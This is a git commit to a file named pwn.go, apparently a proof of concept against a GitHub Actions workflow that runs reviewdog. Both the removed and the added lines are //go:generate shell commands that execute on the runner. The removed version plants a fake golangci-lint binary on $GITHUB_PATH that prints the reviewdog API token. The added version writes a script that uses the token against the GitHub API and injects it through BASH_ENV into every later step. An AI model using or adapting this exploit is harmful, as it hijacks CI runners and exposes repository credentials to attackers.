af2d87e7cad17ac74cb46d4942a01d46862c9811
N0K0 <github@hacky.software>
2026-04-19 22:21:12 +0200

    BASH_ENV injection to capture token in reviewdog step

--- pwn.go
+++ pwn.go
@@ -1,3 +1,3 @@
 package main
 
-//go:generate sh -c "echo '=== RCE CONFIRMED ==='; mkdir -p /tmp/fakepath; printf '#!/bin/sh\necho EXFIL TOKEN: $REVIEWDOG_GITHUB_API_TOKEN\necho TOKEN_LENGTH: $(printf \"%%s\" \"$REVIEWDOG_GITHUB_API_TOKEN\" | wc -c)\n' > /tmp/fakepath/golangci-lint; chmod +x /tmp/fakepath/golangci-lint; echo /tmp/fakepath >> $GITHUB_PATH; echo '--- /tmp/fakepath prepended to PATH for next steps ---'"
+//go:generate sh -c "echo '=== RCE: go generate executed on base-repo runner ==='; printf '#!/bin/sh\nTOKEN_LEN=$(printf \"%%s\" \"$REVIEWDOG_GITHUB_API_TOKEN\" | wc -c)\nHTTP_STATUS=$(curl -s -o /dev/null -w \"%%{http_code}\" -H \"Authorization: Bearer $REVIEWDOG_GITHUB_API_TOKEN\" https://api.github.com/repos/$GITHUB_REPOSITORY)\necho \"=== TOKEN EXFIL ===  length=$TOKEN_LEN  gh-api-status=$HTTP_STATUS\"\n' > /tmp/inject.sh; chmod +x /tmp/inject.sh; echo BASH_ENV=/tmp/inject.sh >> $GITHUB_ENV; echo '--- BASH_ENV injected for all subsequent steps ---'"
